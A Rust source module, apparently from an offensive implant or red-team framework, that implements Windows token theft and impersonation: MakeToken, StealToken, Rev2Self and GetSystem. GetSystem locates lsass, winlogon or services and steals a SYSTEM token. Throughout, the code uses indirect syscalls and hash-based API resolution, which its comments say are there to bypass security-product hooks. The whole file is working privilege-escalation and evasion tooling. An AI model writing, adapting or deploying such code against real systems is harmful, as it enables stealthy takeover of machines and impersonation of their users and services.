//! Token manipulation primitives for Windows.
//!
//! Provides:
//! - **MakeToken** — create a new logon session with supplied credentials.
//! - **StealToken** — duplicate an existing process token and impersonate it.
//! - **Rev2Self** — revert to the original process token.
//! - **GetSystem** — elevate to SYSTEM by impersonating a SYSTEM process token.
//!
//! All NT operations are performed via indirect syscalls resolved through the
//! `nt_syscall` crate to avoid IAT hooks.

#![cfg(windows)]

use anyhow::{anyhow, Context, Result};
use std::sync::{Mutex, OnceLock};
use winapi::um::winnt::{
    HANDLE, TOKEN_ALL_ACCESS, TOKEN_DUPLICATE, TOKEN_IMPERSONATE,
    TOKEN_QUERY, SecurityImpersonation, TokenImpersonation,
};
// CloseHandle kept as fallback inside nt_close_handle() only.
use winapi::um::handleapi::CloseHandle;

/// Stores the impersonation token so `Rev2Self` can close it.
static SAVED_TOKEN: Mutex<Option<HANDLE>> = Mutex::new(None);

/// Stores the original primary token captured on first impersonation.
/// Populated exactly once; subsequent `steal_token` calls must NOT
/// overwrite this — doing so would leak the handle.
static SAVED_PRIMARY_TOKEN: OnceLock<Mutex<Option<HANDLE>>> = OnceLock::new();

fn saved_primary() -> &'static Mutex<Option<HANDLE>> {
    SAVED_PRIMARY_TOKEN.get_or_init(|| Mutex::new(None))
}

// ── Logon type constants (from winnt.h) ────────────────────────────────────
const LOGON32_LOGON_INTERACTIVE: u32 = 2;
const LOGON32_LOGON_NETWORK: u32 = 3;
const LOGON32_LOGON_BATCH: u32 = 4;
const LOGON32_LOGON_SERVICE: u32 = 5;
const LOGON32_LOGON_NETWORK_CLEARTEXT: u32 = 8;
const LOGON32_LOGON_NEW_CREDENTIALS: u32 = 9;

// ── NTSTATUS helpers ───────────────────────────────────────────────────────

fn nt_success(status: i32) -> bool {
    status >= 0
}

fn nt_error(status: i32) -> bool {
    status < 0
}

// ── Indirect syscall wrappers ──────────────────────────────────────────────
// These thin wrappers call through nt_syscall to resolve SSNs and gadget
// addresses at runtime, bypassing user-mode API hooks on Advapi32 / ntdll.

/// Call `NtOpenProcess` via indirect syscall to obtain a HANDLE to a process.
unsafe fn nt_open_process(pid: u32) -> Result<HANDLE> {
    use winapi::um::winnt::PROCESS_QUERY_LIMITED_INFORMATION;
    use winapi::shared::ntdef::{OBJECT_ATTRIBUTES, CLIENT_ID};

    let mut handle: HANDLE = std::ptr::null_mut();
    let mut oa: OBJECT_ATTRIBUTES = std::mem::zeroed();
    oa.Length = std::mem::size_of::<OBJECT_ATTRIBUTES>() as u32;

    let mut cid: CLIENT_ID = std::mem::zeroed();
    cid.UniqueProcess = pid as *mut _;

    let target = nt_syscall::get_syscall_id("NtOpenProcess")
        .map_err(|e| anyhow!("failed to resolve NtOpenProcess SSN: {e}"))?;
    let status = nt_syscall::do_syscall(
        target.ssn,
        target.gadget_addr,
        &[
            &mut handle as *mut _ as u64,
            PROCESS_QUERY_LIMITED_INFORMATION as u64,
            &mut oa as *mut _ as u64,
            &mut cid as *mut _ as u64,
        ],
    );

    if nt_error(status) {
        Err(anyhow!("NtOpenProcess failed: NTSTATUS 0x{status:08X}"))
    } else {
        Ok(handle)
    }
}

/// Call `NtOpenProcessToken` via indirect syscall.
unsafe fn nt_open_process_token(process: HANDLE, access: u32) -> Result<HANDLE> {
    let mut token: HANDLE = std::ptr::null_mut();
    let target = nt_syscall::get_syscall_id("NtOpenProcessToken")
        .map_err(|e| anyhow!("failed to resolve NtOpenProcessToken SSN: {e}"))?;
    let status = nt_syscall::do_syscall(
        target.ssn,
        target.gadget_addr,
        &[
            process as u64,
            access as u64,
            &mut token as *mut _ as u64,
        ],
    );

    if nt_error(status) {
        Err(anyhow!("NtOpenProcessToken failed: NTSTATUS 0x{status:08X}"))
    } else {
        Ok(token)
    }
}

/// Close a kernel handle via `NtClose` indirect syscall (avoids IAT entry for
/// CloseHandle).  Falls back to `CloseHandle` from the IAT if the syscall
/// resolver is unavailable.  Best-effort — errors are silently ignored.
fn nt_close_handle(handle: u64) {
    if handle == 0 || handle == usize::MAX as u64 {
        return;
    }
    if let Ok(target) = nt_syscall::get_syscall_id("NtClose") {
        let _ = unsafe {
            nt_syscall::do_syscall(target.ssn, target.gadget_addr, &[handle])
        };
    } else {
        unsafe { CloseHandle(handle as *mut _ as HANDLE) };
    }
}

/// Call `NtOpenThreadToken` via indirect syscall.
///
/// `open_as_self` should be `true` when opening the calling thread's token
/// while impersonating (otherwise the call uses the process identity).
unsafe fn nt_open_thread_token(
    thread: HANDLE,
    access: u32,
    open_as_self: bool,
) -> Result<HANDLE> {
    let mut token: HANDLE = std::ptr::null_mut();
    let target = nt_syscall::get_syscall_id("NtOpenThreadToken")
        .map_err(|e| anyhow!("failed to resolve NtOpenThreadToken SSN: {e}"))?;
    let status = nt_syscall::do_syscall(
        target.ssn,
        target.gadget_addr,
        &[
            thread as u64,
            access as u64,
            open_as_self as u64,
            &mut token as *mut _ as u64,
        ],
    );
    if nt_error(status) {
        Err(anyhow!("NtOpenThreadToken failed: NTSTATUS 0x{status:08X}"))
    } else {
        Ok(token)
    }
}

/// Call `NtSetInformationThread(ThreadImpersonationToken)` via indirect syscall.
///
/// Passing a null token clears the impersonation token (equivalent to
/// `RevertToSelf`).  Returns the raw NTSTATUS.
unsafe fn nt_set_thread_token(thread: HANDLE, token: HANDLE) -> i32 {
    let target = match nt_syscall::get_syscall_id("NtSetInformationThread") {
        Ok(t) => t,
        Err(e) => {
            log::error!("token_manipulation: failed to resolve NtSetInformationThread SSN: {e}");
            return -1;
        }
    };
    // NtSetInformationThread(
    //   ThreadHandle,
    //   ThreadInformationClass,  // 4 = ThreadImpersonationToken
    //   ThreadInformation,       // pointer to the token HANDLE
    //   ThreadInformationLength  // sizeof(HANDLE)
    // )
    let token_value = token as u64;
    nt_syscall::do_syscall(
        target.ssn,
        target.gadget_addr,
        &[
            thread as u64,
            4u64, // ThreadImpersonationToken
            &token_value as *const u64 as u64,
            std::mem::size_of::<u64>() as u64,
        ],
    )
}

/// Call `NtQuerySystemInformation` via indirect syscall.
unsafe fn nt_query_system_information(
    info_class: u32,
    buffer: *mut u8,
    size: u32,
    return_length: *mut u32,
) -> i32 {
    let target = match nt_syscall::get_syscall_id("NtQuerySystemInformation") {
        Ok(t) => t,
        Err(_) => return -1,
    };
    nt_syscall::do_syscall(
        target.ssn,
        target.gadget_addr,
        &[
            info_class as u64,
            buffer as u64,
            size as u64,
            return_length as u64,
        ],
    )
}

/// SYSTEM_PROCESS_INFORMATION header (variable-size, we only care about PID).
#[repr(C)]
struct SystemProcessInformation {
    next_entry_offset: u32,
    number_of_threads: u32,
    working_set_private_size: i64,
    cycle_count: u64,
    create_time: i64,
    user_time: i64,
    kernel_time: i64,
    image_name_length: u16,
    image_name_maximum_length: u16,
    image_name_buffer: *mut u16,
    base_priority: i32,
    unique_process_id: usize,
    inherited_from_unique_process_id: usize,
}

/// SystemProcessInformation info class.
const SYSTEM_PROCESS_INFORMATION: u32 = 5;

/// Call `NtDuplicateToken` via indirect syscall to create a new impersonation
/// or primary token from an existing token.
unsafe fn nt_duplicate_token(
    existing: HANDLE,
    access: u32,
    token_type: u32,
) -> Result<HANDLE> {
    use winapi::um::winnt::{SECURITY_QUALITY_OF_SERVICE};

    let mut new_token: HANDLE = std::ptr::null_mut();

    let mut sqos: SECURITY_QUALITY_OF_SERVICE = std::mem::zeroed();
    sqos.Length = std::mem::size_of::<SECURITY_QUALITY_OF_SERVICE>() as u32;
    sqos.ImpersonationLevel = SecurityImpersonation as u32;
    sqos.ContextTrackingMode = 0;
    sqos.EffectiveOnly = 0;

    // NtDuplicateToken(
    //   ExistingTokenHandle, DesiredAccess, ObjectAttributes,
    //   EffectiveOnly, TokenType, NewTokenHandle
    // )
    let target = nt_syscall::get_syscall_id("NtDuplicateToken")
        .map_err(|e| anyhow!("failed to resolve NtDuplicateToken SSN: {e}"))?;
    let status = nt_syscall::do_syscall(
        target.ssn,
        target.gadget_addr,
        &[
            existing as u64,
            access as u64,
            &mut sqos as *mut _ as u64,
            0u64, // EffectiveOnly = FALSE
            token_type as u64,
            &mut new_token as *mut _ as u64,
        ],
    );

    if nt_error(status) {
        Err(anyhow!("NtDuplicateToken failed: NTSTATUS 0x{status:08X}"))
    } else {
        Ok(new_token)
    }
}

// ── Public API ─────────────────────────────────────────────────────────────

/// Create a new logon session with the provided credentials.
///
/// `logon_type` maps to the standard `LOGON32_LOGON_*` constants:
///   - 2 = Interactive
///   - 3 = Network
///   - 4 = Batch
///   - 5 = Service
///   - 8 = Network Cleartext
///   - 9 = New Credentials
///
/// On success, the new token is applied to the calling thread and the
/// original token is saved for `Rev2Self`.
pub fn make_token(
    username: &str,
    password: &str,
    domain: &str,
    logon_type: u32,
) -> Result<String> {
    let valid_logon_types = [2, 3, 4, 5, 8, 9];
    let lt = if valid_logon_types.contains(&logon_type) {
        logon_type
    } else {
        LOGON32_LOGON_INTERACTIVE
    };

    let mut token: HANDLE = std::ptr::null_mut();

    let user_cstr = std::ffi::CString::new(username)
        .map_err(|e| anyhow!("invalid username: {e}"))?;
    let pass_cstr = std::ffi::CString::new(password)
        .map_err(|e| anyhow!("invalid password: {e}"))?;
    let dom_cstr = std::ffi::CString::new(domain)
        .map_err(|e| anyhow!("invalid domain: {e}"))?;

    // Resolve LogonUserA from advapi32.dll via PEB walking (no IAT entry).
    let advapi32_base = unsafe {
        pe_resolve::get_module_handle_by_hash(pe_resolve::hash_str(b"advapi32.dll\0"))
    }.ok_or_else(|| anyhow!("failed to resolve advapi32.dll base address"))?;

    let logon_user_addr = unsafe {
        pe_resolve::get_proc_address_by_hash(advapi32_base, pe_resolve::hash_str(b"LogonUserA\0"))
    }.ok_or_else(|| anyhow!("failed to resolve LogonUserA"))?;

    type LogonUserAFn = unsafe extern "system" fn(
        *mut i8, *mut i8, *mut i8, u32, u32, *mut HANDLE,
    ) -> i32;

    let logon_user: LogonUserAFn = unsafe { std::mem::transmute(logon_user_addr) };

    let ok = unsafe {
        logon_user(
            user_cstr.as_ptr() as *mut _,
            dom_cstr.as_ptr() as *mut _,
            pass_cstr.as_ptr() as *mut _,
            lt,
            TOKEN_ALL_ACCESS,
            &mut token,
        )
    };

    if ok == 0 {
        let err = unsafe { winapi::um::errhandlingapi::GetLastError() };
        return Err(anyhow!("LogonUser failed with Win32 error {err}"));
    }

    // Save the current thread token (if any) for Rev2Self.
    save_current_token();

    // Resolve ImpersonateLoggedOnUser from advapi32.dll via PEB walking.
    let impersonate_addr = unsafe {
        pe_resolve::get_proc_address_by_hash(advapi32_base, pe_resolve::hash_str(b"ImpersonateLoggedOnUser\0"))
    }.ok_or_else(|| anyhow!("failed to resolve ImpersonateLoggedOnUser"))?;

    type ImpersonateFn = unsafe extern "system" fn(HANDLE) -> i32;
    let impersonate: ImpersonateFn = unsafe { std::mem::transmute(impersonate_addr) };

    let ok = unsafe { impersonate(token) };
    let impersonate_result = if ok == 0 {
        let err = unsafe { winapi::um::errhandlingapi::GetLastError() };
        Err(anyhow!("ImpersonateLoggedOnUser failed with Win32 error {err}"))
    } else {
        Ok(())
    };

    nt_close_handle(token as u64);

    impersonate_result?;

    let lt_name = match lt {
        2 => "Interactive",
        3 => "Network",
        4 => "Batch",
        5 => "Service",
        8 => "NetworkCleartext",
        9 => "NewCredentials",
        _ => "Unknown",
    };

    Ok(format!(
        "MakeToken: created {} logon session for {}\\{}",
        lt_name, domain, username
    ))
}

/// Duplicate the token of a target process and begin impersonating it.
///
/// Uses indirect syscalls to open the target process and duplicate its token,
/// avoiding IAT hooks on `OpenProcessToken` / `DuplicateTokenEx`.
pub fn steal_token(target_pid: u32) -> Result<String> {
    // Open the target process via indirect syscall.
    let process = unsafe { nt_open_process(target_pid) }
        .with_context(|| format!("failed to open process PID {target_pid}"))?;

    // Open the process token via indirect syscall.
    let token = unsafe { nt_open_process_token(process, TOKEN_DUPLICATE | TOKEN_QUERY) }
        .with_context(|| format!("failed to open token for PID {target_pid}"))?;

    // ── Save the original primary token (once only) ─────────────────
    //
    // On the very first impersonation we open our own process token and
    // stash it in SAVED_PRIMARY_TOKEN so that Rev2Self can restore it.
    // Subsequent calls do NOT overwrite it — that would leak the handle.
    {
        let guard = saved_primary().lock().unwrap();
        if guard.is_none() {
            // Drop the lock before the syscall, then re-acquire to store.
            drop(guard);
            // Use pseudo-handle (-1) for current process + indirect syscall.
            let current_process: HANDLE = (-1isize) as HANDLE;
            let primary = unsafe {
                nt_open_process_token(current_process, TOKEN_ALL_ACCESS).ok()
            };
            if let Some(primary) = primary {
                if !primary.is_null() {
                    let mut guard = saved_primary().lock().unwrap();
                    // Double-check: another thread may have populated it while
                    // we were in the syscall.
                    if guard.is_none() {
                        *guard = Some(primary);
                    } else {
                        // Lost the race — close the extra handle.
                        nt_close_handle(primary as u64);
                    }
                }
            }
            // If NtOpenProcessToken fails we proceed anyway — Rev2Self will
            // fall back to clearing the impersonation token via
            // NtSetInformationThread(NULL) which restores the process token.
        }
    }

    // Duplicate into an impersonation token via indirect syscall.
    let token_type = TokenImpersonation as u32;
    let new_token = unsafe { nt_duplicate_token(token, TOKEN_ALL_ACCESS, token_type) }
        .context("failed to duplicate token")?;

    // Apply the impersonation token via NtSetInformationThread (no IAT entry).
    let current_thread: HANDLE = (-2isize) as HANDLE;
    let status = unsafe { nt_set_thread_token(current_thread, new_token) };
    if nt_error(status) {
        nt_close_handle(new_token as u64);
        nt_close_handle(token as u64);
        nt_close_handle(process as u64);
        return Err(anyhow!(
            "NtSetInformationThread(ThreadImpersonationToken) failed: NTSTATUS 0x{status:08X}"
        ));
    }

    nt_close_handle(token as u64);
    nt_close_handle(process as u64);

    // Store the impersonation token so Rev2Self can close it.
    {
        let mut saved = SAVED_TOKEN.lock().unwrap();
        // Close any previously stored impersonation token (from a prior
        // steal_token call that was not reverted) to avoid leaking it.
        if let Some(old_imp) = saved.take() {
            nt_close_handle(old_imp as u64);
        }
        *saved = Some(new_token);
    }

    Ok(format!("StealToken: now impersonating token from PID {target_pid}"))
}

/// Revert to the original process token (undo `StealToken` / `MakeToken`).
///
/// Closes the impersonation token via `NtClose` (indirect syscall), then
/// restores the saved primary token via `SetThreadToken(None, primary)`,
/// and finally closes the saved primary token handle.
pub fn rev2self() -> Result<String> {
    // ── Close the impersonation token via NtClose ──────────────────────
    {
        let mut saved = SAVED_TOKEN.lock().unwrap();
        if let Some(imp_token) = saved.take() {
            nt_close_handle(imp_token as u64);
        }
    }

    // ── Restore the saved primary token ────────────────────────────────
    //
    // If we have a saved primary token, apply it to the thread directly
    // via NtSetInformationThread.  This is more reliable than RevertToSelf
    // when the impersonation was set via SetThreadToken.  Fall back to
    // clearing the impersonation token (NULL) otherwise.
    let primary_opt = {
        let mut guard = saved_primary().lock().unwrap();
        guard.take()
    }; // guard dropped here — lock released before syscall.
    let current_thread: HANDLE = (-2isize) as HANDLE;
    unsafe {
        if let Some(primary) = primary_opt {
            nt_set_thread_token(current_thread, primary);
            // Close the saved primary token handle now that we've restored.
            nt_close_handle(primary as u64);
        } else {
            // No saved primary — clear the impersonation token by passing NULL.
            // This is equivalent to RevertToSelf.
            nt_set_thread_token(current_thread, std::ptr::null_mut());
        }
    }

    Ok("Rev2Self: reverted to original process token".to_string())
}

/// Elevate to SYSTEM by finding a SYSTEM-owned process and stealing its token.
///
/// Strategy: enumerate running processes via `NtQuerySystemInformation`,
/// find one running as NT AUTHORITY\SYSTEM (e.g. winlogon.exe, lsass.exe,
/// services.exe), and impersonate its token.
pub fn get_system() -> Result<String> {
    // First call to NtQuerySystemInformation to determine buffer size.
    let mut return_length: u32 = 0;
    let status = unsafe {
        nt_query_system_information(
            SYSTEM_PROCESS_INFORMATION,
            std::ptr::null_mut(),
            0,
            &mut return_length,
        )
    };

    // STATUS_INFO_LENGTH_MISMATCH (0xC0000004) is expected.
    let buf_size = if return_length > 0 {
        return_length as usize + 0x1_0000 // generous padding
    } else {
        0x4_0000 // 256 KiB default
    };

    let mut buffer = vec![0u8; buf_size];

    let status = unsafe {
        nt_query_system_information(
            SYSTEM_PROCESS_INFORMATION,
            buffer.as_mut_ptr(),
            buf_size as u32,
            &mut return_length,
        )
    };

    if !nt_success(status) {
        return Err(anyhow!(
            "NtQuerySystemInformation(SystemProcessInformation) failed: 0x{status:08X}"
        ));
    }

    // Target process names that run as SYSTEM (lowercase ASCII).
    let system_procs = [
        "winlogon.exe",
        "lsass.exe",
        "services.exe",
    ];

    let my_pid = unsafe { winapi::um::processthreadsapi::GetCurrentProcessId() };

    // Iterate process list. Each entry has a NextEntryOffset at offset 0.
    // If NextEntryOffset == 0, this is the last entry.
    let mut offset: usize = 0;
    loop {
        if offset + std::mem::size_of::<SystemProcessInformation>() > buffer.len() {
            break;
        }

        let entry = unsafe {
            &*(buffer.as_ptr().add(offset) as *const SystemProcessInformation)
        };

        let pid = entry.unique_process_id as u32;
        if pid != 0 && pid != my_pid {
            // Read the image name (UTF-16) from the entry.
            let name_len = entry.image_name_length as usize;
            if name_len > 0 && !entry.image_name_buffer.is_null() {
                // The image_name_buffer points into kernel memory that was
                // copied into our buffer by NtQuerySystemInformation — it
                // is a relative offset from the start of the entry, not a
                // pointer we can dereference directly.  However, the actual
                // bytes follow the fixed header in the buffer.
                //
                // The name buffer is embedded in the variable-length portion
                // of the entry immediately after the fixed header.
                let name_start = offset + std::mem::size_of::<SystemProcessInformation>();
                let name_end = name_start + name_len;
                if name_end <= buffer.len() {
                    // Decode UTF-16 bytes to a String.
                    let name_u16: Vec<u16> = (0..name_len / 2)
                        .map(|i| {
                            let off = name_start + i * 2;
                            u16::from_le_bytes([buffer[off], buffer[off + 1]])
                        })
                        .collect();
                    let name_str = String::from_utf16_lossy(&name_u16);
                    let filename = name_str.rsplit('\\').next().unwrap_or(&name_str).to_lowercase();

                    if system_procs.iter().any(|sp| filename == *sp) {
                        return steal_token(pid);
                    }
                }
            }
        }

        let next = entry.next_entry_offset as usize;
        if next == 0 {
            break;
        }
        offset += next;
    }

    Err(anyhow!("GetSystem: no suitable SYSTEM process found"))
}

// ── Helpers ────────────────────────────────────────────────────────────────

/// Return the current impersonation token handle if one is active.
///
/// Used by `interactive_shell` to create child processes with the correct
/// security context (e.g. `CreateProcessWithTokenW`).  Returns a null
/// `HANDLE` when no impersonation token is set.
pub fn get_current_token() -> HANDLE {
    let saved = SAVED_TOKEN.lock().unwrap();
    saved.unwrap_or(std::ptr::null_mut())
}

/// Save the current thread's impersonation token (if any) for later restoration.
fn save_current_token() {
    // Use pseudo-handle (-2) for current thread.
    let current_thread: HANDLE = (-2isize) as HANDLE;
    let token_result = unsafe {
        nt_open_thread_token(current_thread, TOKEN_ALL_ACCESS, true)
    };

    let mut saved = SAVED_TOKEN.lock().unwrap();
    match token_result {
        Ok(token) if !token.is_null() => {
            // There was a thread token — save it.
            // Close any previously saved token first.
            if let Some(old) = saved.take() {
                nt_close_handle(old as u64);
            }
            *saved = Some(token);
        }
        _ => {
            // No thread token (NtOpenThreadToken failed, likely
            // STATUS_NO_TOKEN) — that's fine. Rev2Self will clear
            // the impersonation token via NtSetInformationThread(NULL).
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn logon_type_constants_are_standard() {
        assert_eq!(LOGON32_LOGON_INTERACTIVE, 2);
        assert_eq!(LOGON32_LOGON_NETWORK, 3);
        assert_eq!(LOGON32_LOGON_BATCH, 4);
        assert_eq!(LOGON32_LOGON_SERVICE, 5);
        assert_eq!(LOGON32_LOGON_NETWORK_CLEARTEXT, 8);
        assert_eq!(LOGON32_LOGON_NEW_CREDENTIALS, 9);
    }
}
